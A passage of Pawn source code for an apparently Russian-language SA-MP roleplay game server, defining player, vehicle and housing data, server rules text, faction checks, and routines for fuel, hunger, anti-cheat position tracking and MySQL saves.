	{"{FFFFFF}- Отправлять более одной заявки в час (Исключение: Просьба Администрации).\n"},
	{"{FFFFFF}- Если вам отказали в смене ника, Значит нельзя.\n"}
};
new RulesMSGG[22][] = {
	{"{FFFFFF}3. Чат:\n"},
	{"{FFFFFF}- OOC (Out Of Charter) - это всё, что касается реального мира.\n"},
	{"{FFFFFF}- IC (In Charter) - это всё, что касается виртульного мира, то есть игры.\n"},
	{"{FFFFFF}Запрещено:\n"},
	{"{FFFFFF}- Ругательство, оскорбления или нецензурная речь.\n"},
	{"{FFFFFF}- Угрозы игрокам (Не относящиеся к игровому процессу).\n"},
	{"{FFFFFF}- Писать сообщения в верхнем регистре (Caps Lock).\n"},
	{"{FFFFFF}- Писать в чат объявлений сообщения не относящихся к Role Play.\n"},
	{"{FFFFFF}- Писать одно и тоже сообщение слишком часто.\n"},
	{"{FFFFFF}- Обсуждать, критиковать действия администрации.\n"},
	{"{FFFFFF}- Реклама сторонних ресурсов.\n\n"},
	{"{FFFFFF}4. Администрация сервера:\n"},
	{"{FFFFFF}- Необходимо сообщать администрации о каких либо нарушениях из данных правил (/mm > Репорт).\n"},
	{"{FFFFFF}- Администрация самостоятельно выбирает штрафные санкции для каждого из случаев.\n"},
	{"{FFFFFF}- Запрещено препятствовать администрации в работе.\n"},
	{"{FFFFFF}- Решение администрации является окончательным и не подлежит обсуждению.\n\n"},
	{"{FFFFFF}5. Торговля:\n"},
	{"{FFFFFF}- Запрещены любые денежные махинации.\n"},
	{"{FFFFFF}- Запрещена продажа / покупка чего либо, за реальные деньги.\n"},
	{"{FFFFFF}- Запрещен обмен внеигровых предметов в любой форме, на игровые.\n"},
	{"{FFFFFF}- Запрещен обмен чего либо между игровыми серверами.\n"},
	{"{FFFFFF}- Запрещена продажа / передача аккаунтов.\n"}
};
enum carInfo
{
	carID[5],
	carModel[5],
	carColor_one[5],
	carColor_two[5],
	carPercent[5],
    Float:carFuel[5],
	carVehcom_1[5],
	carVehcom_2[5],
	carVehcom_3[5],
	carVehcom_4[5],
	carVehcom_5[5],
	carVehcom_6[5],
	carVehcom_7[5],
	carVehcom_8[5],
	carVehcom_9[5],
	carVehcom_10[5],
	carVehcom_11[5],
	carVehcom_12[5],
	carVehcom_13[5],
	carVehcom_14[5]
};
new CarInfo[MAX_PLAYERS][carInfo];
enum pInfo
{
	pName[50],
	pKey[128],
	pChas,
	pMin,
	pLogin,
	pEmail[128],
	pLevel,
	pAdmin,
	pHelper,
	pRatingSupport,
	pJobHeal,
	pJobHealLeader,
	pMestoJail,
	pIp[128],
	pvIp[128],
	pIpReg[128],
	pHousecash,
	pCheckip,
	pGoogleKey[17],
	pGoogleIP,
	pText,
	pKeyip[128],
	Float:pHP,
	Float:pArmour,
	pKeys,
	pPKeys,
	pSatiety,
	pDataReg[128],
	pDonateRank,
	pMats,
	pSex,
	pArrested,
	pMuted,
	pCrimes,
	pExp,
	pCash,
	pWantedDeaths,
	pPayCheck,
	pJailTime,
	pDrugs,
	pLeader,
	pMember,
	pRank,
	pChar[6],
	pChars[32],
	pJob,
	pModel,
	pPnumber,
	pDirectory,
	pVhoddata,
	pVhodMes,
	pVhodchas,
	pVhodminute,
	pCarLic,
	pFlyLic,
	pBoatLic,
	pFishLic,
	pGunLic,
	pBizLic,
	pNkeys,
	pAvtomas,
	pZakonp,
	pAddiction,
	pNarcoLomka,
	pPayDayHad,
	pTut,
	pWarns,
	OffWarns,
	punWarns,
	pFuel,
	pMarriedTo[128],
	pDrug[128],
	pMushrooms,
    Float:pFishes,
	pFishesPach,
	pBank,
	pDonateAccount,
	pMobile,
	pDolg,
	pKrisha,
	pUseKrisha,
	pWantedLevel,
	pWeapon[11],
	pWeapons[32],
	pAmmo[11],
	pAmmos[32],
	pGunSkill[6],
	pGunSkills[32],
	ptaxiexp,
	ptaxilvl,
	pTraining,
	pBoxSkill,
	pKongfuSkill,
	pKickboxSkill,
	pDLevel,
	pDExp,
	pKvartiraKey,
	pPHouseKey,
	pPBizzKey,
	pPFarmKey,
	pPLimitBank,
	pDMgruz,
	pPSkill,
	pPProc,
	pPMGruz,
	pQuestL,
	pQuest,
	pQuestP,
	pQuestF,
	pQuestPF,
	pQuestShow,
	pDgruz,
	pOnline[128],
	pOnlineLid[128],
	Float:pPos_x,
	Float:pPos_y,
	Float:pPos_z,
	pSkilla,
	pRecognition,
	pRobHouse,
	pActivemail,
	SalonCar,
	SalonTime,
	pDrivingSkill,
	pProdsSkill[2],
	pSpawnChange[2],
	bool:progolos,
	pGRating,
	pDonateMoney,
};
new PlayerInfo[MAX_PLAYERS][pInfo];
#define Name(%1) PlayerInfo[%1][pName]

stock SetPlayerCheckpointEx(playerid,Float:x,Float:y,Float:z,Float:r)
{
	SetPVarInt(playerid,"checkpoint",1);
	return SetPlayerCheckpoint(playerid,x,y,z,r);
}
stock DisablePlayerCheckpointEx(playerid)
{
	DeletePVar(playerid,"checkpoint");
	return DisablePlayerCheckpoint(playerid);
}
#define SetPlayerCheckpoint SetPlayerCheckpointEx
#define DisablePlayerCheckpoint DisablePlayerCheckpointEx
stock ResetPlayerWeaponsEx(playerid)
{
	for(new i = 1; i < 46; i++) Weapons[playerid][i] = 0;
	ResetPlayerWeapons(playerid);
	SetTimerEx("AntiNopResetPlayerWeapon" , 3000, false, "i", playerid);
}
stock PutPlayerInVehicleEx(playerid,vehicleid,seatid)
{
	vehicleidtp[playerid] = vehicleid;
	PutPlayerInVehicle(playerid,vehicleid,seatid);
}
stock t_SetPlayerPos( playerid, Float:x, Float:y, Float:z )
{
	SetPVarInt(playerid, "AntiBreik", 2);
	PlayerInfo[ playerid ][ pPos_x ] = x;
	PlayerInfo[ playerid ][ pPos_y ] = y;
	PlayerInfo[ playerid ][ pPos_z ] = z;
	return SetPlayerPos( playerid, x, y, z );
}
new Float:car_coord[MAX_VEHICLES][4], bool:car_ex[MAX_VEHICLES];
stock t_SetVehiclePos(vehicleid, Float:x, Float:y, Float:z)
{
	foreach(i)
	{
		if(IsPlayerInVehicle(i, vehicleid))
		{
			SetPVarInt(i, "AntiBreik", 2);
			PlayerInfo[ i ][ pPos_x ] = x;
			PlayerInfo[ i ][ pPos_y ] = y;
			PlayerInfo[ i ][ pPos_z ] = z;
		}
	}
	car_coord[vehicleid][0] = x;
	car_coord[vehicleid][1] = y;
	car_coord[vehicleid][2] = z;
	car_ex[vehicleid] = true;
	return SetVehiclePos(vehicleid, x, y, z);
}
enum PickInfo
{
Float: PickX,
Float: PickY,
Float: PickZ
}

new PickupInfo[MAX_PICKUPS][PickInfo];
CreatePickupAC(model, type, Float:X, Float:Y, Float:Z, virtualworld = 0)
{
	new TempID = CreateDynamicPickup(model, type, X, Y, Z, virtualworld);
	PickupInfo[TempID][PickX] = X;
	PickupInfo[TempID][PickY] = Y;
	PickupInfo[TempID][PickZ] = Z;
	return TempID;
}
#define CreatePickup CreatePickupAC
SetVehicleZAngleEx(vehicleid,Float:z)
{
	SetVehicleZAngle(vehicleid,z);
	car_ex[vehicleid] = true;
	car_coord[vehicleid][3] = z;
	return true;
}
#define SetVehicleZAngle SetVehicleZAngleEx

publics: kick(giveplayerid)
{
	if(PlayerInfo[giveplayerid][pLogin] == 1) SaveMySQL(2, giveplayerid);
	Kick(giveplayerid);
	return false;
}
#define Kick(%0) SetTimerEx("kick",70,false,"i",%0)
enum hInfo
{
	Float:hEntrancex,
	Float:hEntrancey,
	Float:hEntrancez,
	Float:hExitx,
	Float:hExity,
	Float:hExitz,
	Float:hCarx,
	Float:hCary,
	Float:hCarz,
	Float:hCarc,
	hOwner[MAX_PLAYER_NAME],
	hValue,
	hHel,
	hInt,
	hLock,
	hTakings,
	hDate,
	hKlass,
	hVec,
	hVcol1,
	hVcol2,
	hPickup,
	hMIcon,
	hVehSost,
	hSafe[11],
	hSafes[128],
	hID,
Text3D:hExitText
};
new HouseInfo[990][hInfo];
new global[MAX_PLAYERS];
new podeezdi;
new exitpodeezd;
new podeezdils;
// *************************** Система квартир Samp-Rp **************************
enum podInfo
{
	pid,
Float:podPicX,
Float:podPicY,
Float:podPicZ,
	podEtazi,
	podInt,
	podMir[11],
	podPic,
Float:carX,
Float:carY,
Float:carZ,
Float:carC,
};
new PodeezdInfo[1000][podInfo], AllPODEZD, ALLPODEZD;
enum kInfo
{
	kid,
Float:pXpic,
Float:pYpic,
Float:pZpic,
	vladelec[MAX_PLAYER_NAME],
Text3D: dtext,
	lock,
	kworld,
	aptek,
	plata,
	kCena,
	kInt,
	virtmir
};
new kvartinfo[1000][kInfo],ALLKVARTIRI;
enum pHaul
{
	pLoad
};
enum sHaul
{
	sLoad
};
enum pMatss
{
	gBallas,
	gVagos,
	gGrove,
	gAztek,
	gRifa
};
new Furi[1][pMatss];
new maxMats[pMatss];
enum pMat
{
	mCapasity,
	mLoad
};
new MatHaul[NUMBER_OF_ARMYTRUCKS][pMat];
new PlayerHaul[18][pHaul];
new PlayersHaul[10][sHaul];
enum pCrime
{
	pAccusedof[32],
	pVictim[32]
};
new PlayerCrime[MAX_PLAYERS][pCrime];
new JoinPed[107][1] = {
	{280},//LSPD1 
	{76},//LSPD2 
	{284},//LSPD3 
	{303}, //LSPD4 
	{304}, //LSPD5 
	//============
	{286},//FBI1
	{163},//FBI2
	{164},//FBI3
	{165},//FBI4
	{166},//FBI5
	{141},//FBI6
	//============
	{287},//ArmySF1
	{191},//ArmySF2 
	//============
	{274},//Mediks1 
	{275},//Mediks2 
	{276},//Mediks3 
	{219},//Mediks4 
	//============
	{112},//LCN1
	{223},//LCN2
	{124},//LCN3
	{113},//LCN4
	{214},//LCN5
	//============
	{120},//YAKUZA1
	{123},//YAKUZA3
	{169},//YAKUZA2
	{186},//YAKUZA4
	//============
	{57},//Goverment1 // 1 rang //26
	{187},//Goverment2 // 2 rang
	{150},//Goverment3 // 1 rang
	{98},//Goverment4 // 4 rang
	{147},//Goverment5 147 5-6 rang //30
	//============
	{301},//SFPD1
	{281},//SFPD2
	{282},//SFPD3
	{283},//SFPD4
	{284},//SFPD5
	{285},//SFPD6
	{288},//SFPD7
	{76},//SFPD8
	//===========
	{250},//SFNEWS1
	{261},//SFNEWS2
	{211},//SFNEWS3
	{217},//SFNEWS4
	//===========
	{171},//Casino1
	{11},//Casino2
	//===========
	{59},//Instructors1
	{172},//Instructors2
	{189},//Instructors3
	{240},//Instructors4
	//==========
	{302},//LVPD1
	{305},//LVPD2
	{282},//LVPD3
	{283},//LVPD4
	{284},//LVPD5
	{285},//LVPD6
	{288},//LVPD7
	{76},//LVPD8
	//==========
	{112},//RussianMafia1
	{111},//RussianMafia2
	{125},//RussianMafia4
	{272},//RussianMafia3
	{214},//RussianMafia5
	//==========
	{105},//GROOVE1
	{106},//GROOVE2
	{107},//GROOVE3
	{269},//GROOVE4
	{270},//GROOVE5
	{271},//GROOVE6
	//==========
	{114},//Aztecas1
	{115},//Aztecas2
	{116},//Aztecas3
	//==========
	{102},//BALLAS1
	{103},//BALLAS2
	{104},//BALLAS3
	//==========
	{173},//RIFA1
	{174},//RIFA2
	{175},//RIFA3
	//==========
	{108},//VAGOS1
	{109},//VAGOS2
	{110},//VAGOS3
	//==========
	{287},//ArmyLV1
	{191},//ArmyLV2
	//==========
	{250},//LSNEWS1
	{261},//LSNEWS2
	{211},//LSNEWS3
	{217},//LSNEWS4
	//==========
	{287},//PED1
	{287},//PED2
	{191},//PED3
	{287},//PED4
	{287},//PED5
	{191},//PED6
	{287},//PED7
	{200},//PED8
	{230},//PED9
	{137},//PED10
	{212},//PED11
	{79},//PED12 //98
	{78},//PED13
	{96},//PED14
	{90},//PED15
	{55},//PED16
	//==========
	{247},//Bikers1
	{248},//Bikers2
	{254},//Bikers3
	{298},//Bikers4
	{201}//Bikers5
};
new FishNames[18][20] = {
	{"Камболу"},
	{"Скумбрия"},
	{"Карась"},
	{"Форель"},
	{"Треска"},
	{"Горбыль"},
	{"Красноперка"},
	{"Щука"},
	{"Парус"},
	{"Тунец"},
	{"Ель"},
	{"Дельфин"},
	{"Окула"},
	{"Черепаха"},
	{"Сом"},
	{"Рыба-меч"},
	{"Катран"},
	{"Сайда"}
};
new GribNames[3][20] = {
	{"Белый"},
	{"Мухомор"},
	{"Гроздь"}
};
publics: NoNalog(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	new leader = PlayerInfo[playerid][pLeader];
	new member = PlayerInfo[playerid][pMember];
	new job = PlayerInfo[playerid][pJob];
	new krish = PlayerInfo[playerid][pKrisha];
	if(member == 5 || member == 6 || member == 12 || member==13 || member == 14|| member == 15|| member == 17 || member == 18 || member == 23 || member == 24 || member == 25 || member == 26 || member == 22 || member == 28 || member == 29 || member == 30 || member == 31 || member == 33) return true;
	if(leader == 5 || leader == 6 || leader == 12 || leader==13 || leader == 14|| leader == 15|| leader == 17 || leader == 18 || leader == 23 || leader == 24 || leader == 25 || leader == 26 || leader == 22 || leader == 28 || leader == 29 || leader == 30 || leader == 31 || leader == 33) return true;
	if(member==0 && job == 0) return true;
	if(member==0 && krish > 0) return true;
	return false;
}
publics: IsASafe(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	if(PlayerToPoint(2.0,playerid,230.39050, 1074.91089, 1084.22534) ||
			PlayerToPoint(2.0,playerid,247.94943, 1118.25439, 1080.44409) ||
			PlayerToPoint(2.0,playerid,94.42898, 1331.83606, 1088.04138) ||
			PlayerToPoint(2.0,playerid,147.13652, 1369.42163, 1088.24805) ||
			PlayerToPoint(2.0,playerid,2339.87964, -1143.09265, 1054.03723) ||
			PlayerToPoint(2.0,playerid,228.54663, 1202.83069, 1080.44629) ||
			PlayerToPoint(2.0,playerid,257.16074, 1243.07251, 1084.11511) ||
			PlayerToPoint(2.0,playerid,20.01370, 1409.36584, 1084.25842) ||
			PlayerToPoint(2.0,playerid,484.40237, 1398.02075, 1080.37439) ||
			PlayerToPoint(2.0,playerid,376.05988, 1414.69226, 1081.01965) ||
			PlayerToPoint(2.0,playerid,377.13617, 1468.84985, 1080.19617) ||
			PlayerToPoint(2.0,playerid,292.74359, 1471.77417, 1080.11719) ||
			PlayerToPoint(2.0,playerid,2457.05884, -1701.78662, 1013.04858) ||
			PlayerToPoint(2.0,playerid,-44.66017, 1403.76001, 1084.56116) ||
			PlayerToPoint(2.0,playerid,-72.16850, 1359.06702, 1080.08374) ||
			PlayerToPoint(2.0,playerid,-272.09415, 1454.00806, 1084.17139) ||
			PlayerToPoint(2.0,playerid,258.62341, 1285.05847, 1080.10437) ||
			PlayerToPoint(2.0,playerid,443.57379, 1397.04810, 1084.39709) ||
			PlayerToPoint(2.0,playerid,422.28943, 2539.07520, 9.84995) ||
			PlayerToPoint(2.0,playerid,274.48193, 303.70056, 998.57611) ||
			PlayerToPoint(2.0,playerid,250.11301, 301.71036, 998.65039) ||
			PlayerToPoint(2.0,playerid,228.62782, 1285.73279, 1081.87048) ||
			PlayerToPoint(2.0,playerid,225.97635, 1238.43115, 1081.76917) ||
			PlayerToPoint(2.0,playerid,220.46881, 1286.62891, 1082.49561) ||
			PlayerToPoint(2.0,playerid,2230.42480, -1109.80933, 1051.33984) ||
			PlayerToPoint(2.0,playerid,228.83421, 1154.15857, 1083.08423) ||
			PlayerToPoint(2.0,playerid,2212.18799, -1073.90381, 1051.21570) ||
			PlayerToPoint(2.0,playerid,335.99869, 1476.61987, 1084.93628) ||
			PlayerToPoint(2.0,playerid,2263.10010, -1220.13806, 1049.82166) ||
			PlayerToPoint(2.0,playerid,2813.21899, -1166.67578, 1026.27979) ||
			PlayerToPoint(2.0,playerid,2245.88379, -1070.92590, 1049.95911) ||
			PlayerToPoint(2.0,playerid,2368.42041, -1119.34619, 1051.42432) ||
			PlayerToPoint(2.0,playerid,2328.59790, -1016.68817, 1055.17456) ||
			PlayerToPoint(2.0,playerid,225.63176, 1039.91479, 1085.00623) ||
			PlayerToPoint(2.0,playerid,147.42175, 1365.36816, 1084.83923))
	{
		return true;
	}
	return false;
}
publics: IsAMafia(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	new leader = PlayerInfo[playerid][pLeader];
	new member = PlayerInfo[playerid][pMember];
	if(member == 5 || member == 6 || member == 14) return true;
	if(leader == 5|| leader == 6 || leader == 14) return true;
	return false;
}
publics: IsABiker(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	new leader = PlayerInfo[playerid][pLeader];
	new member = PlayerInfo[playerid][pMember];
	if(member==24 || member==26 || member==29) return true;
	if(leader==24 || leader==26 || leader==29) return true;
	return false;
}
publics: IsAGang(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	new leader = PlayerInfo[playerid][pLeader];
	new member = PlayerInfo[playerid][pMember];
	if(member==12 || member==13 || member==15 || member==17 || member==18) return true;
	if(leader==12 || leader==13 || leader==15 || leader==17 || leader==18) return true;
	return false;
}
new Peds[57][1] = {
	{79},
	{254},{259},{249},{248},{247},{242},{239},{228},
	{185},{184},{160},{155},{135},{126},{122},{121},{101},
	{100},{96},{82},{83},{84},{294},{94},{73},{67},
	{28},{29},{24},{23},{22},{21},
	{20},{19},{18},{17},{15},
	{7},{2},{299},{297},{296},{293},{46},
	{198},{197},{196},
	{190},{193},{243},{178},{192},{199},{201},{214},
	{224}
};
publics: PrintBizInfo(playerid,targetid)
{
	new mafiatext[10];
	switch(BizzInfo[targetid][bMafia])
	{
	case 5: mafiatext = "LCN"; case 6: mafiatext = "Yakuza";
	case 14: mafiatext = "RM"; default: mafiatext = "Нет";
	}
	format(string,304, "Название\t\t%s\nМафия\t\t\t%s\nБаланс\t\t\t%i вирт\nПрибыль за час\t%i вирт\nПродукты\t\t%i/%i\nЦена за товар\t\t%i вирт\nЦена за продукт\t%i вирт\nЦена за вход\t\t%i вирт\nСостояние\t\t%s\nЭлектроенергия\t%i/96000 вирт\nНалог за электроэнергию: %i вирт\nЛицензия\t%s\nЧасов закрыт/без продуктов: %i",
	BizzInfo[targetid][bMessage],mafiatext,BizzInfo[targetid][bTill],BizzPay[targetid],BizzInfo[targetid][bProducts],BizzMaxProds[targetid],BizzInfo[targetid][bPrice],BizzInfo[targetid][bProdPrice],BizzInfo[targetid][bEntranceCost],(!BizzInfo[targetid][bLocked])?("Открыт") : ("Закрыт"),BizzInfo[targetid][bLandTax],BizzLandTax[targetid],(!BizzInfo[targetid][bLicense])?("Нет") : ("Есть"),BizzInfo[targetid][bLockTime]);
	return ShowPlayerDialogEx(playerid,10349,DIALOG_STYLE_LIST, "Статистика бизнеса",string, "Закрыть", "");
}
stock BuyHouse(h)
{
	DestroyDynamicMapIcon(HouseInfo[h][hMIcon]);
	DestroyDynamicPickup(HouseInfo[h][hPickup]);
	DestroyDynamic3DTextLabel(HouseInfo[h][hExitText]);
	HouseInfo[h][hExitText] = CreateDynamic3DTextLabel("Чтобы выйти, нажмите клавишу '~k~~VEHICLE_ENTER_EXIT~'\nКупить/продать, нажмите клавишу '~k~~SNEAK_ABOUT~'",0x0076FCFF,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz]+1,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,h+50);
	if(strcmp(HouseInfo[h][hOwner],"None",true) == 0)
	{
		HouseInfo[h][hPickup] = CreatePickupAC(1273, 23, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez],-1);
		HouseInfo[h][hMIcon] = CreateDynamicMapIcon(HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez], 31, -1, 0, -1, -1,150);
	}
	else
	{
		HouseInfo[h][hPickup] = CreatePickupAC(1272, 23, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez],-1);
		HouseInfo[h][hMIcon] = CreateDynamicMapIcon(HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez], 32, -1, 0, -1, -1,150);
	}
	return true;
}
main() { }
stock Vehicleforeach(vehicleid)
{
	foreach(i)
	{
		if(house_car[i] == vehicleid) return i;
	}
	return -1;
}
publics: HPCheck()
{
	foreach(i)
	{
		if(PlayerInfo[i][pLogin] == 0) continue;
		GetVehicleParamsEx(GetPlayerVehicleID(i),engine,lights,alarm,doors,bonnet,boot,objective);
		if(!IsAPlane(GetPlayerVehicleID(i)) && !IsABoat(GetPlayerVehicleID(i)) && !IsABike(GetPlayerVehicleID(i)) && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER && engine == 1)
		{
		    new h = GetPVarInt(i, "chosencar");
			if(Vehicleforeach(GetPlayerVehicleID(i)) != -1)
			{
				if(GetVehicleModel(GetPlayerVehicleID(i)) >= ShopCar[0][0] && GetVehicleModel(GetPlayerVehicleID(i)) <= ShopCar[56][0])
				{
					switch(CarInfo[Vehicleforeach(GetPlayerVehicleID(i))][carPercent][h])
					{
					case 51..100: Fuell[GetPlayerVehicleID(i)] -= 1.0000;
					case 5..50: Fuell[GetPlayerVehicleID(i)] -= 2.0000;
					default: Fuell[GetPlayerVehicleID(i)] -= 4.0000;
					}
				}
				else
				{
					switch(CarInfo[Vehicleforeach(GetPlayerVehicleID(i))][carPercent][h])
					{
					case 51..100: Fuell[GetPlayerVehicleID(i)] -= 2.0000;
					case 5..50: Fuell[GetPlayerVehicleID(i)] -= 4.0000;
					default: Fuell[GetPlayerVehicleID(i)] -= 8.0000;
					}
				}
				CarInfo[Vehicleforeach(GetPlayerVehicleID(i))][carFuel][h] = Fuell[GetPlayerVehicleID(i)];
			}
			else Fuell[GetPlayerVehicleID(i)] -= 1.0000;
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_CARS"` SET fuel = '%f' WHERE id = '%i' AND owner = '%s'", CarInfo[i][carFuel][h], h, PlayerInfo[i][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
		}
		new Float:health;
		GetPlayerHealth(i,health);
		//if(PlayerInfo[i][pTut] != 0 && health <= 10.0) SCM(i, COLOR_YELLOW, " У вас сильно ухудшилось здоровье, вылечитесь у медика!");
		if(PlayerInfo[i][pSatiety] > 0) PlayerInfo[i][pSatiety] -= 1;
		mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pHP = '%f', pMin = '%i', pChas = '%i' WHERE name = '%e'", PlayerInfo[i][pSatiety], PlayerInfo[i][pHP], PlayerInfo[i][pMin], PlayerInfo[i][pChas], PlayerInfo[i][pName]);
        mysql_function_query(DATABASE,QUERY,false,"","");
		if(PlayerInfo[i][pSatiety] == 49 || PlayerInfo[i][pSatiety] == 24) SCM(i,COLOR_LIGHTGREEN, " Вы проголодались! Посетите бар, закусочную или купите ХотДог. Узнать свою «Сытость» можно командой /satiety");
		if(PlayerInfo[i][pSatiety] < 50) SetPlayerHealthAC(i, health - 1.0);
		else if(PlayerInfo[i][pSatiety] < 25) SetPlayerHealthAC(i, health - 2.0);
		else if(PlayerInfo[i][pSatiety] < 0) SetPlayerHealthAC(i, health - 3.0);
		PlayerInfo[i][pMin]++;
		if(PlayerInfo[i][pMin] >= 60) PlayerInfo[i][pChas]++, PlayerInfo[i][pMin] = 0;
	}
	return true;
}
stock DollahScoreUpdate(playerid) return SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
stock GivePlayerPPCash(playerid, money)
{
	PCash[playerid] = PCash[playerid] + money;
	ResetPlayerMoney(playerid);
	GivePlayerMoney(playerid,PCash[playerid]);
	return PCash[playerid];
}
stock ResetPlayerPCash(playerid)
{
	PCash[playerid] = 0;
	ResetPlayerMoney(playerid);
	GivePlayerMoney(playerid,PCash[playerid]);
	return PCash[playerid];
}
publics: Float:GetDistanceBetweenPlayerss(p1,p2)
{
	new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
	if(!IsPlayerConnected(p1) || !IsPlayerConnected(p2))
	{
		return -1.00;
	}
	GetPlayerPos(p1,x1,y1,z1);
	GetPlayerPos(p2,x2,y2,z2);
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}
publics: MyHttpResponses(index, response_code, data[])
{
    if(response_code == 200) //Запрос успешен?
    {
        //Да!
        SCM(index, COLOR_YELLOW, " На текущий Эмэил отправлен код подтверждения");
    }
    else
    {
        //нет!
        SCM(index, COLOR_GREY, " Произошла ошибка в отправке!");
    }
}
publics: MyHttpResponse2(index, response_code, data[])
{
    if(response_code == 200) //Запрос успешен?
    {
        //Да!
        SCM(index, COLOR_YELLOW, " Новый пароль выслан на Эмеил");
    }
    else
    {
        //нет!
        SCM(index, COLOR_GREY, " Произошла ошибка в отправке!");
    }
}
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
        SetVehiclePos(GetPlayerVehicleID(playerid), fX, fY, fZ);
        PutPlayerInVehicle(playerid, GetPlayerVehicleID(playerid), 0);
    }
    else
    {
        SetPlayerPos(playerid, fX, fY, fZ);
    }
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid, 0);
	return true;
}
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(SERVERTEST) SendMes(playerid,COLOR_BLUE,"PLAYERID - %i, VEHICLEID - %i, ISPASSENGER - %i",playerid,vehicleid,ispassenger);
	SetPVarInt(playerid, "NoAB", 1);
	SetPVarInt(playerid, "GunCheckTime", 2);
	SetPlayerArmedWeapon(playerid,0);
	SetPVarInt(playerid,"not_engine",0);
	SetPVarInt(playerid,"not_engine_",0);
	if(usemats[playerid] > 0)
	{
		if(usemats[playerid] == 1) armmatsf += 250;
		if(usemats[playerid] == 2) lsamatbi += 250;
		if(usemats[playerid] == 3) armmatbi += 250;
		usemats[playerid] = 0;
		RemovePlayerAttachedObject(playerid, 1);
		SCM(playerid, COLOR_LIGHTRED," Вы уронили ящик");
		SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
	}
	if(GetPVarInt(playerid, "matovoz_rob"))
	{
        MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad] += 250;
        format(string, sizeof(string), "Кол-во груза\n%i", MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad]);
        UpdateDynamic3DTextLabelText(Rob3DText, 0xEDEA9FAA, string);
		RemovePlayerAttachedObject(playerid, 1);
		SCM(playerid, COLOR_LIGHTRED," Вы уронили ящик");
		SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
	}
	if(!ispassenger) vehicleidtp[playerid] = vehicleid;
	Refueling[playerid] = 0;
	SetPVarInt(playerid, "EnterVehTime", GetTickCount() + 250);
	return true;
}
publics: IsAMedic(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	new leader = PlayerInfo[playerid][pLeader];
	new member = PlayerInfo[playerid][pMember];
	if(member == 4 || member == 22 || member == 23 || member == 33) return true;
	else if(leader == 4 || leader == 22 || leader == 23 || leader == 33) return true;
	return false;
}
publics: IsAMayor(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	new leader = PlayerInfo[playerid][pLeader];
	new member = PlayerInfo[playerid][pMember];
	if(member == 7 || leader == 7) return true;
	return false;
}
publics: IsALicenser(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	new leader = PlayerInfo[playerid][pLeader];
	new member = PlayerInfo[playerid][pMember];
	if(member == 11 || leader == 11) return true;
	return false;
}
publics: IsACop(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	new leader = PlayerInfo[playerid][pLeader];
	new member = PlayerInfo[playerid][pMember];
	if(member == 1 || member == 2 || member == 10 || member == 21) return true;
	else if(leader == 1 || leader == 2 || leader == 10 || leader == 21) return true;
	return false;
}
publics: IsAArm(playerid)
{
	if(!IsPlayerConnected(playerid)) return false;
	new leader = PlayerInfo[playerid][pLeader];
	new member = PlayerInfo[playerid][pMember];
	if(member == 3 || member == 19) return true;
	else if(leader == 3 || leader == 19) return true;
	return false;
}
stock IsAAntidm(playerid)
{
	if(PlayerToPoint(90.0,playerid,1154.3456,-1769.5636,16.5938)
			||PlayerToPoint(50.0,playerid,829.0444,5.0235,1004.1870)
			||PlayerToPoint(70.0,playerid,1480.9207,-1747.6909,15.3086)
			||PlayerToPoint(10.0,playerid,263.6395,78.5962,1001.0391)
			||PlayerToPoint(35.0,playerid,-2036.2848,-112.6223,496.5230)
			||PlayerToPoint(50.0,playerid,1310.2367,-1369.0114,13.5568)
			||PlayerToPoint(50.0,playerid,2850.9866,1291.0491,11.3906)
			||PlayerToPoint(70.0,playerid,-1967.6156,117.4343,27.6875)
			||PlayerToPoint(100.0,playerid,1995.1815,1017.2842,994.8906)
			||PlayerToPoint(100.0,playerid,2238.6624,1631.8488,1008.3594)
			||PlayerToPoint(60.0,playerid,1545.7631,-1290.8684,15.9647)
			||PlayerToPoint(60.0,playerid,1130.5286,-1.7705,1000.6797)
			||PlayerToPoint(70.0,playerid,2215.5352,-1157.3821,25.7266)
			||PlayerToPoint(70.0,playerid,370.5885,173.6026,1008.3828)
			||PlayerToPoint(70.0,playerid,1779.3578,-1912.4808,13.3888))
	{
		return true;
	}
	return false;
}
stock IsATerra(playerid)
{
	if(PlayerInfo[playerid][pMember] == 12 && PlayerToPoint(20.0,playerid,2651.4746,-2004.3387,13.3828) // Ballas
			||PlayerInfo[playerid][pMember] == 13 && PlayerToPoint(20.0,playerid,2770.7471,-1628.7227,12.1775) // Vagos
			||PlayerInfo[playerid][pMember] == 15 && PlayerToPoint(20.0,playerid,2492.7532,-1676.3687,13.3380) // Groove
